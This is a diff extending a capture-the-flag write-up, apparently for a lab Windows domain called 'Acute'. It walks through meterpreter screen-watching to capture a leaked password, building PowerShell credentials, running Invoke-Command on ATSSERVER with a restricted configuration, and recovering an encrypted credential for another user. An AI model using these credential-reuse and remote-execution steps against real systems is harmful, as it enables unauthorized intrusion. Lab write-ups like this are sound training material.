@@ -152,5 +152,70 @@ and we got a hit back:
 
 meterpreter >
 ```
+type shell to switch.
+> meterpreter > shell
 
+### imonk on ATSSERVER
+```powershell
+PS C:\Utils> ipconfig
+windows IP Configuration
+
+Ethernet adapter Ethernet 2:
+    Connection-specific DNS suffix  . :
+    Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14
+    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+    Default Gateway . . . . . . . . . : 172.16.22.1
+    . .
+```
+The gateway is likely the host.
+
+After a bit of manual enumeration I didn't reach anything, it's time for [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+while running it I noticed a RDP session active.
+
+well, meterpreter have a active **screenshare** options I'll give it a try.
+you'll see a the desktop front for a while, after that a Powershell terminal opens as edavies following to create a credential object, and uses it to connect to the atsserver machine as the imonks user with the password leaked:
+
+![](img/pwd_leak_screen.png)
+
+I’ll create a credential object also:
+```powershell
+PS C:\Utils> $pass = ConvertTo-securestring "W3_4R3th3_f0rce." -AsPlainText -Force
+PS C:\Utils> $cred = New-object System.Management.Automation.PScredential("ACUTE\imonks", $pass)
+```
+if i try to spawn a PSsesion it rejects it (access denied)
+
+It’s possible that imonks is only allowed to connect with the `dc_manage` config that shows in the image . Specifying that gives a different error message (The term 'Measure-Object' is not recognized as the name of cmdlet)
+I assume that it fails because the user imonks doesn't have access to the `Measure-Object` cmdlet. This could be an issue with the `dc_manage` conf
+
+we can use the `Invoke-Command` this should work
+
+and yes! it is
+```powershell
+PS C:\Utils> Invoke-Command -ScriptBlock {whoami} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+acute\imonks
+```
+we can get the user flag now
+
+```powershell
+PS C:\Utils> Invoke-Command -ScriptBlock { cat C:\users\imonks\desktop\user.txt } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+```
+we also can see a file beside the flag file on imonks desktop `vm.ps1` that look suspicious:
+
+```powershell
+PS C:\Utils> Invoke-Command -ScriptBlock { ls C:\users\imonks\desktop} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+    Directory: C:\Users\imonks\desktop
+ Mode               LastWriteTime       Length Name
+ ----               -------------       ------ ----             
+ -ar---     05/06/2022      22:16           34 user.txt
+ -a----     11/01/2022      18:04          602 wm.ps1
+```
+
+it got creds for jmorgan on Acute-PC01:
+
+```powershell
+$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
+Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
+```
 to be continued...
